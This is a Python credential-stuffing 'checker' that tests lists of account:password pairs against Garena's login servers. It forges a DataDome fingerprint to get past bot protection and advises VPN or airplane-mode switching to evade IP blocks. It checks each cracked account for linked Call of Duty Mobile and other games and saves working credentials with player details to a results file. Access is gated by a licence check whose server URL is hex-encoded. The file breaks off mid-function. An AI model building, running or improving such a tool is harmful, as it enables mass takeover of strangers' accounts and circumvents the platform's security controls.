import hashlib
import requests
import time
import json
import os
import urllib.parse
from Crypto.Cipher import AES
import logging
import random
import cloudscraper
import colorama
import threading
from collections import Counter
import platform
import uuid
import sys
import urllib3
import signal

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_GLOBAL_SUBSCRIPTION_ACTIVE = False
_GLOBAL_DEVICE_ID = None
_GLOBAL_USER_NAME = None


_ENCRYPTED_SUBSCRIPTION_API_URL_PART1 = "48747470733a2f2f6461726b7864656174682e6f6e72656e6465722e636f6d2f"
_ENCRYPTED_SUBSCRIPTION_API_URL_PART2 = "6170692e706870"

def _get_decrypted_subscription_api_url():
    try:
        part1 = bytes.fromhex(_ENCRYPTED_SUBSCRIPTION_API_URL_PART1).decode('utf-8')
        part2 = bytes.fromhex(_ENCRYPTED_SUBSCRIPTION_API_URL_PART2).decode('utf-8')
        return part1 + part2
    except Exception as e:
        logger.error(f"Critical error decrypting API URL: {e}")
        sys.exit(1)

def _check_integrity():
    return True

def get_device_id():
    dir_path = os.path.expanduser("~/.dont_delete_me")
    file_path = os.path.join(dir_path, "here.txt")
    user_name = ""
    if os.path.exists(file_path):
        logger.info("Existing device ID file found.")
        try:
            with open(file_path, 'r') as file:
                content = file.read().strip()
                if content and '_' in content:
                    parts = content.split('_', 1)
                    user_name = parts[0]
                    device_id = content
                    logger.info(f"Using existing device ID: {device_id} (User: {user_name})")
                    return device_id, user_name
                else:
                    logger.warning("Existing device ID file is malformed or empty, generating new one.")
        except IOError as e:
            logger.error(f"Error reading existing device ID file: {e}. Generating new one.")
    os.makedirs(dir_path, exist_ok=True)
    logger.info("Generating new device ID...")
    while True:
        user_name = input(f"{colorama.Fore.YELLOW}Enter your name (3-20 characters): {colorama.Style.RESET_ALL}").strip()
        if 3 <= len(user_name) <= 20:
            break
        logger.error("Name must be between 3 and 20 characters.")
    system_info = [
        platform.system(),
        platform.release(),
        platform.version(),
        platform.machine(),
        platform.processor()
    ]
    hardware_string = "-".join(system_info)
    unique_id = uuid.uuid5(uuid.NAMESPACE_DNS, hardware_string)
    device_hash = hashlib.sha256(unique_id.bytes).hexdigest()
    device_id = f"{user_name}_{device_hash[:8]}"
    try:
        with open(file_path, 'w') as file:
            file.write(device_id)
        logger.info(f"New device ID generated and saved: {device_id}")
    except IOError as e:
        logger.error(f"Error saving device ID to {file_path}: {e}. Please check permissions.")
    return device_id, user_name

def check_subscription(device_id, user_name):
    if not _check_integrity():
        logger.error("Integrity check failed. Exiting.")
        sys.exit(1)

    url = f"{_get_decrypted_subscription_api_url()}?device_id={device_id}&user_name={user_name}"
    try:
        response = requests.get(url, verify=False, timeout=15)
        response.raise_for_status()
        response_json = response.json()
        return response_json
    except requests.exceptions.RequestException as e:
        logger.error(f"Subscription server request failed: {e}")
        return {"status": "error", "message": "Subscription server request failed."}

def device_main():
    global _GLOBAL_SUBSCRIPTION_ACTIVE, _GLOBAL_DEVICE_ID, _GLOBAL_USER_NAME

    logger.info("Initializing PORTEQUE Checker...")

    if not _check_integrity():
        logger.error("Integrity check failed during initialization. Exiting.")
        sys.exit(1)

    device_id, user_name = get_device_id()
    _GLOBAL_DEVICE_ID = device_id
    _GLOBAL_USER_NAME = user_name

    logger.info(f"Checking subscription for Device ID: {device_id} (User: {user_name})")
    subscription_response = check_subscription(device_id, user_name)
    status = subscription_response.get("status")
    message = subscription_response.get("message", "No message")

    if status == "active":
        logger.info(f"Subscription Status: Active. Access granted! {message}")
        _GLOBAL_SUBSCRIPTION_ACTIVE = True
        return True
    elif status in ["pending", "registered_pending"]:
        logger.warning(f"Subscription Status: Pending Approval. {message}")
        logger.info(f"Your Device ID: {device_id}")
    elif status == "expired":
        logger.error(f"Subscription Status: Expired. {message}")
        logger.info(f"Your Device ID: {device_id}")
    else:
        logger.error(f"Subscription Status Unknown: {status}. {message}")
        logger.info(f"Your Device ID: {device_id}")
    return False

colorama.init(autoreset=True)

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m'
    }
    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger(__name__)
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.codm_count = 0
        self.no_codm_count = 0
        self.lock = threading.Lock()
        
    def update_stats(self, valid=False, clean=False, has_codm=False):
        with self.lock:
            if valid:
                self.valid_count += 1
                if has_codm:
                    self.codm_count += 1
                else:
                    self.no_codm_count += 1
                    
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
            else:
                self.invalid_count += 1
                
    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'codm': self.codm_count,
                'no_codm': self.no_codm_count
            }
            
    def display_stats(self):
        stats = self.get_stats()
        return f"[LIVE STATS] VALID [{stats['valid']}] | INVALID [{stats['invalid']}] | CLEAN [{stats['clean']}] | NOT CLEAN [{stats['not_clean']}] | CODM [{stats['codm']}] | NO CODM [{stats['no_codm']}] -> config @poqruette"

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    
    def get_valid_cookie(self):
        if os.path.exists('fresh_cookies.txt'):
            with open('fresh_cookies.txt', 'r') as f:
                valid_cookies = [c for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
            if valid_cookies:
                return random.choice(valid_cookies)
        return None
    
    def save_cookie(self, cookie):
        if not self.is_banned(cookie):
            with open('fresh_cookies.txt', 'a') as f:
                f.write(cookie + '\n')
            return True
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            logger.info(f"[INFO] DataDome cookie updated: {datadome_cookie[:30]}...")
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            logger.error(f"[ERROR] IP blocked after 3 attempts.")
            logger.error(f"[INFO] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
            logger.info(f"[INFO] Script PAUSED. Fix your network and press Enter to continue...")
            
            input()
            
            logger.info(f"[INFO] Auto-fetching new DataDome cookie...")
            new_datadome = get_datadome_cookie(session)
            if new_datadome:
                self.set_datadome(new_datadome)
                self._403_attempts = 0
                logger.info(f"[SUCCESS] Auto-fetched new DataDome: {new_datadome[:30]}...")
                return True
            else:
                logger.error(f"[ERROR] Failed to auto-fetch DataDome cookie")
                return False
        return False

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} cookies")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False,
            "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864,
            "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US",
            "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
            "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True,
            "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False,
            "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False,
            "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.",
            "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably",
            "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
            "acma": "maybe", "acmats": False, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
            "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe",
            "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True,
            "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
            "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True,
            "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }
    
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    retries = 3
    
    for attempt in range(retries):
        try:
            response = session.post(url, headers=headers, data=data, timeout=30)
            response.raise_for_status()
            
            try:
                response_json = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from DataDome")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            if response_json.get('status') == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                if '=' in cookie_string and ';' in cookie_string:
                    datadome = cookie_string.split(';')[0].split('=')[1]
                else:
                    datadome = cookie_string
                    
                logger.info(f"[SUCCESS] DataDome cookie found: {datadome[:30]}...")
                return datadome
            else:
                logger.warning(f"[WARNING] DataDome cookie not found. Status: {response_json.get('status')}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                    
        except requests.exceptions.RequestException as e:
            logger.error(f"[ERROR] Error getting DataDome cookie (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
        except Exception as e:
            logger.error(f"[ERROR] Unexpected error getting DataDome cookie: {e}")
            if attempt < retries - 1:
                time.sleep(2)
    
    return None

def prelogin(session, account, datadome_manager):
    global _GLOBAL_SUBSCRIPTION_ACTIVE, _GLOBAL_DEVICE_ID
    
    if not _GLOBAL_SUBSCRIPTION_ACTIVE:
        logger.error(f"🔒 Subscription not active. Cannot perform prelogin for {account}")
        return None, None, None

    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'connection': 'keep-alive',
        'host': 'sso.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
        'X-Device-ID': _GLOBAL_DEVICE_ID
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            if response.status_code == 403:
                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1})")
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, None
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from prelogin for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, None
            
            new_datadome = None
            try:
                cookies_dict = response.cookies.get_dict()
                new_datadome = cookies_dict.get('datadome')
            except Exception as e:
                logger.warning(f"[WARNING] Error extracting datadome from prelogin response: {e}")
            
            if 'error' in data:
                logger.error(f"[ERROR] Prelogin error for {account}: {data['error']}")
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                logger.error(f"[ERROR] Missing v1 or v2 in prelogin response for {account}")
                return None, None, new_datadome
                
            logger.info(f"[SUCCESS] Prelogin successful: {account}")
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 403:
                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1})")
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, None
            else:
                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}): {e}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
        except Exception as e:
            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from login for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            sso_key = response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                logger.error(f"[ERROR] Login failed for {account}: {error_msg}")
                
                if error_msg == 'error_auth':
                    logger.warning(f"[WARNING] Authentication error - likely invalid credentials for {account}")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"[WARNING] Captcha required for {account}")
                    time.sleep(3)
                    continue
                    
            logger.info(f"[SUCCESS] Logged in: {account}")
            return sso_key
            
        except requests.RequestException as e:
            logger.error(f"[ERROR] Login request failed for {account} (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
        
        token_response = session.post(token_url, headers=token_headers, data=token_data)
        token_data = token_response.json()
        return token_data.get("access_token", "")
    except Exception as e:
        logger.error(f"❌ Error getting CODM access token: {e}")
        return ""

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
        
        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")
        
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
            
    except Exception as e:
        logger.error(f"❌ Error processing CODM callback: {e}")
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        check_response = session.get(check_login_url, headers=check_headers)
        check_data = check_response.json()
        
        user_data = check_data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
        
    except Exception as e:
        logger.error(f"❌ Error getting CODM user info: {e}")
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            logger.warning(f"⚠️ No CODM access token for {account}")
            return has_codm, codm_info
        
        codm_token, status = process_codm_callback(session, access_token)
        
        if status == "no_codm":
            logger.info(f"⚠️ No CODM detected for {account}")
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            logger.warning(f"⚠️ CODM callback failed for {account}: {status}")
            return has_codm, codm_info
        
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
            logger.info(f"✅ CODM detected for {account}: Level {codm_info.get('codm_level', 'N/A')}")
            
    except Exception as e:
        logger.error(f"❌ Error checking CODM for {account}: {e}")
    
    return has_codm, codm_info

def display_codm_info(account, codm_info):
    if not codm_info:
        return ""
    
    display_text = f" | CODM: {codm_info.get('codm_nickname', 'N/A')} (Level {codm_info.get('codm_level', 'N/A')})"
    
    region = codm_info.get('region', '')
    if region and region != 'N/A':
        display_text += f" [{region.upper()}]"
    
    return display_text

def save_codm_account(account, password, codm_info):
    if not codm_info:
        return
    
    try:
        if not os.path.exists('Results'):
            os.makedirs('Results')
            
        with open('Results/codm_accounts.txt', 'a', encoding='utf-8') as f:
            f.write(f"{account}:{password} | ")
            f.write(f"Nickname: {codm_info.get('codm_nickname', 'N/A')} | ")
            f.write(f"Level: {codm_info.get('codm_level', 'N/A')} | ")
            f.write(f"Region: {codm_info.get('region', 'N/A')} | ")
            f.write(f"UID: {codm_info.get('uid', 'N/A')}\n")
            
        logger.info(f"💾 Saved CODM account: {account}")
    except Exception as e:
        logger.error(f"❌ Error saving CODM account {account}: {e}")

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    
    game_mappings = {
        'tw': {
            "100082": "CODM",
            "100067": "FREE FIRE",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100105": "GARENA UNDAWN",
            "100050": "ROV",
            "100151": "DELTA FORCE",
            "100147": "FAST THRILL",
            "100107": "MOONLIGHT BLADE"
        },
        'th': {
            "100067": "FREEFIRE",
            "100055": "ROV",
            "100082": "CODM",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100130": "BLACK CLOVER M",
            "100070": "SPEED DRIFTERS",
            "32836": "FC ONLINE",
            "100071": "FC ONLINE M",
            "100124": "MOONLIGHT BLADE"
        },
        'vn': {
            "32837": "FC ONLINE",
            "100072": "FC ONLINE M",
            "100054": "ROV",
            "100137": "THE WORLD OF WAR"
        },
        'default': {
            "100082": "CODM",
            "100067": "FREEFIRE",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100057": "AOV",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100055": "ROV"
        }
    }

    try:
        logger.info(f"[INFO] CHECKING GAME CONNECTIONS...")
        
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30)
        
        try:
            token_data = token_response.json()
            access_token = token_data.get("access_token", "")
        except json.JSONDecodeError:
            logger.error(f"[ERROR] Invalid JSON response from token grant for {account}")
            return ["No game connections found"]
        
        if not access_token:
            logger.warning(f"[WARNING] No access token for {account}")
            return ["No game connections found"]

        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
        inspect_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }
        inspect_data = {"token": access_token}
        
        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data, timeout=30)
        session_key_roles = inspect_response.cookies.get('session_key')
        if not session_key_roles:
            logger.warning(f"[WARNING] No session_key in response cookies for {account}")
            return ["No game connections found"]
        
        try:
            inspect_data = inspect_response.json()
        except json.JSONDecodeError:
            logger.error(f"[ERROR] Invalid JSON response from token inspect for {account}")
            return ["No game connections found"]
            
        uac = inspect_data.get("uac", "ph").lower()
        region = uac if uac in valid_regions else 'ph'
        
        logger.info(f"[REGION] {region.upper()}")
        
        if region == 'th' or region == 'in':
            base_domain = "termgame.com"
        elif region == 'id':
            base_domain = "kiosgamer.co.id"
        elif region == 'vn':
            base_domain = "napthe.vn"
        else:
            base_domain = f"shop.garena.{region}"
        
        applicable_games = game_mappings.get(region, game_mappings['default'])
        detected_roles = {}
        
        for app_id, game_name in applicable_games.items():
            roles_url = f"https://{base_domain}/api/shop/apps/roles"
            params_roles = {'app_id': app_id}
            headers_roles = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                'Accept': "application/json, text/plain, */*",
                'Accept-Language': "en-US,en;q=0.5",
                'Accept-Encoding': "gzip, deflate, br, zstd",
                'Connection': "keep-alive",
                'Referer': f"https://{base_domain}/?app={app_id}",
                'Sec-Fetch-Dest': "empty",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Site': "same-origin",
                'Cookie': f"session_key={session_key_roles}"
            }
            
            try:
                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=30)
                
                try:
                    roles_data = roles_response.json()
                except json.JSONDecodeError:
                    print(f"{colorama.Fore.RED}[NOT FOUND] {game_name}..{colorama.Style.RESET_ALL}")
                    continue
                
                role = None
